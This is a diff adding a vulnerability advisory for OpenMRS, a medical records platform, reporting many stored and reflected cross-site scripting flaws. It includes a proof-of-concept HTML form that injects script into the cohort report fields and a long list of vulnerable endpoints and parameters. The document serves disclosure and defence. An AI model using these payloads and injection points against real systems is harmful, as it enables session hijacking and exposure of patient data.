@@ -1,0 +1,121 @@
+OpenMRS 2.3 (1.11.4) Multiple Cross-Site Scripting Vulnerabilities
+
+
+Vendor: OpenMRS Inc.
+Product web page: http://www.openmrs.org
+Affected version: OpenMRS 2.3, 2.2, 2.1, 2.0 (Platform 1.11.4 (Build 6ebcaf), 1.11.2 and 1.10.0)
+                  OpenMRS-TB System (OpenMRS 1.9.7 (Build 60bd9b))
+
+Summary: OpenMRS is an application which enables design
+of a customized medical records system with no programming
+knowledge (although medical and systems analysis knowledge
+is required). It is a common framework upon which medical
+informatics efforts in developing countries can be built.
+
+Desc: OpenMRS suffers from multiple stored and reflected
+cross-site scripting vulnerabilities when input passed via
+several parameters to several scripts is not properly sanitized
+before being returned to the user. This can be exploited to
+execute arbitrary HTML and script code in a user's browser
+session in context of an affected site.
+
+
+Tested on: Ubuntu 12.04.5 LTS
+           Apache Tomcat/7.0.26
+           Apache Tomcat/6.0.36
+           Apache Coyote/1.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5287
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5287.php
+
+Vendor: https://talk.openmrs.org/t/openmrs-security-advisories-2015-11-30/3868
+
+
+02.11.2015
+
+--
+
+
+PoC:
+
+<html>
+  <body>
+    <form action="http://127.0.0.1:8080/openmrs/admin/reports/cohortReport.form" method="POST">
+      <input type="hidden" name="parentUUID" value="71dde2c8&#45;60be&#45;4171&#45;9d3d&#45;71293cdc4142" />
+      <input type="hidden" name="name" value=""><script>alert&#40;1&#41;<&#47;script>" />
+      <input type="hidden" name="description" value=""><script>alert&#40;2&#41;<&#47;script>" />
+      <input type="submit" value="Submit" />
+    </form>
+  </body>
+</html>
+
+
+Other vulnerable scripts/parameters (GET/POST, Stored/Reflected)
+Payload: <script>alert(1)</script>
+
+http://127.0.0.1:8080/openmrs/admin/person/addPerson.htm [addName parameter]
+http://127.0.0.1:8080/openmrs/admin/person/addPerson.htm [personType parameter]
+http://127.0.0.1:8080/openmrs/admin/person/addPerson.htm [viewType parameter]
+http://127.0.0.1:8080/openmrs/admin/users/users.list [Referer HTTP header]
+http://127.0.0.1:8080/openmrs/admin/users/user.form [userId parameter]
+http://127.0.0.1:8080/openmrs/options.form [defaultLocation parameter]
+http://127.0.0.1:8080/openmrs/options.form [lang parameter]
+http://127.0.0.1:8080/openmrs/options.form [newPassword parameter]
+http://127.0.0.1:8080/openmrs/options.form [oldPassword parameter]
+http://127.0.0.1:8080/openmrs/options.form [personName.familyName parameter]
+http://127.0.0.1:8080/openmrs/options.form [personName.givenName parameter]
+http://127.0.0.1:8080/openmrs/options.form [secretAnswerNew parameter]
+http://127.0.0.1:8080/openmrs/options.form [secretQuestionPassword parameter]
+http://127.0.0.1:8080/openmrs/options.form [username parameter]
+http://127.0.0.1:8080/openmrs/adminui/systemadmin/accounts/account.page [addUserAccount parameter]
+http://127.0.0.1:8080/openmrs/adminui/systemadmin/accounts/account.page [familyName parameter]
+http://127.0.0.1:8080/openmrs/adminui/systemadmin/accounts/account.page [gender parameter]
+http://127.0.0.1:8080/openmrs/adminui/systemadmin/accounts/account.page [givenName parameter]
+http://127.0.0.1:8080/openmrs/adminui/systemadmin/accounts/account.page [username parameter]
+http://127.0.0.1:8080/openmrs/htmlformentryui/htmlform/enterHtmlFormWithStandardUi.page [definitionUiResource parameter]
+http://127.0.0.1:8080/openmrs/htmlformentryui/htmlform/enterHtmlFormWithStandardUi.page [returnUrl parameter]
+http://127.0.0.1:8080/openmrs/login.htm [sessionLocation parameter]
+http://127.0.0.1:8080/openmrs/referenceapplication/userApp.page [action parameter]
+http://127.0.0.1:8080/openmrs/uicommons/messages/get.action [codes parameter]
+http://127.0.0.1:8080/openmrs/admin/reports/cohortReport.form [description parameter]
+http://127.0.0.1:8080/openmrs/admin/reports/cohortReport.form [name parameter]
+http://127.0.0.1:8080/openmrs/admin/reports/cohortReport.form [parameterName parameter]
+http://127.0.0.1:8080/openmrs/admin/reports/cohortReport.form [parentUUID parameter]
+http://127.0.0.1:8080/openmrs/admin/reports/cohortReport.form [reportId parameter]
+http://127.0.0.1:8080/openmrs/admin/reports/reportMacros.form [macros parameter]
+http://127.0.0.1:8080/openmrs/admin/reports/reportSchemaXml.form [reportSchemaId parameter]
+http://127.0.0.1:8080/openmrs/admin/reports/reportSchemaXml.form [xml parameter]
+http://127.0.0.1:8080/openmrs/admin/reports/runReport.form [schedule parameter]
+http://127.0.0.1:8080/openmrs/dictionary/concept.form [namesByLocale%5Ben%5D.name parameter]
+http://127.0.0.1:8080/openmrs/module/reporting/viewPortlet.htm [id parameter]
+http://127.0.0.1:8080/openmrs/module/reporting/widget/getMappedAsString.form [cancelCallback parameter]
+http://127.0.0.1:8080/openmrs/module/reporting/widget/getMappedAsString.form [label parameter]
+http://127.0.0.1:8080/openmrs/module/reporting/widget/getMappedAsString.form [saveCallback parameter]
+http://127.0.0.1:8080/openmrs/module/reporting/widget/getMappedAsString.form [valueType parameter]
+http://127.0.0.1:8080/openmrs/module/metadatasharing/export/edit.form [type parameter]
+http://127.0.0.1:8080/openmrs/admin/orders/orderDrug.form [concept parameter]
+http://127.0.0.1:8080/openmrs/admin/orders/orderDrug.form [instructions parameter]
+http://127.0.0.1:8080/openmrs/admin/orders/orderDrug.form [orderType parameter]
+http://127.0.0.1:8080/openmrs/admin/orders/orderDrug.form [patient parameter]
+http://127.0.0.1:8080/openmrs/admin/person/addPerson.htm [addAge parameter]
+http://127.0.0.1:8080/openmrs/admin/person/addPerson.htm [personType parameter]
+http://127.0.0.1:8080/openmrs/admin/person/addPerson.htm [viewType parameter]
+http://127.0.0.1:8080/openmrs/admin/scheduler/scheduler.form [description parameter]
+http://127.0.0.1:8080/openmrs/admin/scheduler/scheduler.form [name parameter]
+http://127.0.0.1:8080/openmrs/admin/scheduler/scheduler.form [taskClass parameter]
+http://127.0.0.1:8080/openmrs/admin/scheduler/scheduler.list [taskId parameter]
+http://127.0.0.1:8080/openmrs/dictionary/concept.form [namesByLocale%5Ben%5D.name parameter]
+http://127.0.0.1:8080/openmrs/dictionary/concept.form [namesByLocale%5Ben_GB%5D.name parameter]
+http://127.0.0.1:8080/openmrs/dictionary/concept.form [namesByLocale%5Bfr%5D.name parameter]
+http://127.0.0.1:8080/openmrs/dictionary/concept.form [namesByLocale%5Bht%5D.name parameter]
+http://127.0.0.1:8080/openmrs/dictionary/concept.form [synonymsByLocale%5Ben%5D%5B0%5D.name parameter]
+http://127.0.0.1:8080/openmrs/module/logic/editRuleDefinition.form [description parameter]
+http://127.0.0.1:8080/openmrs/module/logic/editRuleDefinition.form [name parameter]
+http://127.0.0.1:8080/openmrs/module/logic/editRuleDefinition.form [ruleContent parameter]
+http://127.0.0.1:8080/openmrs/module/logic/logic.form [patientId parameter]
+http://127.0.0.1:8080/openmrs/patientDashboard.form [patientGraphConcept parameter]
